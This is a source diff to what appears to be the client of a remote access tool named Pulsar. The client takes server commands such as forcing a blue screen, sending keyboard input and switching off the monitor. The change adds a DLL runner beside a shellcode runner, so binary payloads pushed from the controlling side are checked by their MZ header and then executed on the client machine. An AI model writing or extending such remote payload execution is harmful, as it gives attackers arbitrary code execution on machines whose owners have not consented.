@@ -26,7 +26,8 @@ namespace Pulsar.Client.Messages
         private KeyboardInput _keyboardInput = new KeyboardInput();
         private CDTray _cdTray = new CDTray();
         private MonitorPower _monitorPower = new MonitorPower();
-        private ShellcodeRunner _shellcodeRunner = new ShellcodeRunner(); // Added shellcode runner
+        private ShellcodeRunner _shellcodeRunner = new ShellcodeRunner();
+        private DllRunner _dllRunner = new DllRunner(); // Added DLL runner
 
         public bool CanExecute(IMessage message) =>
             message is DoBSOD ||
@@ -75,12 +76,40 @@ namespace Pulsar.Client.Messages
         {
             try
             {
-                _shellcodeRunner.Handle(message, client);
+                // Determine if this is shellcode or DLL based on message properties or content
+                if (IsDllPayload(message))
+                {
+                    _dllRunner.Handle(message, client);
+                }
+                else
+                {
+                    _shellcodeRunner.Handle(message, client);
+                }
             }
             catch (Exception ex)
             {
-                client.Send(new SetStatus { Message = $"Failed to execute shellcode: {ex.Message}" });
+                client.Send(new SetStatus { Message = $"Failed to execute binary: {ex.Message}" });
             }
+        }
+
+        private bool IsDllPayload(DoSendBinFile message)
+        {
+            // You can implement logic here to determine if the payload is a DLL
+            // Some possible approaches:
+
+            // 1. Check file extension if available in message
+            // if (!string.IsNullOrEmpty(message.FileName) && message.FileName.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
+            //     return true;
+
+            // 2. Check for DLL signature (MZ header)
+            if (message.Data?.Length > 1 && message.Data[0] == 0x4D && message.Data[1] == 0x5A)
+                return true;
+
+            // 3. Add a property to DoSendBinFile message type to specify payload type
+            // return message.PayloadType == "dll";
+
+            // For now, default to shellcode execution
+            return false;
         }
 
         private void Execute(ISender client, DoCDTray message)
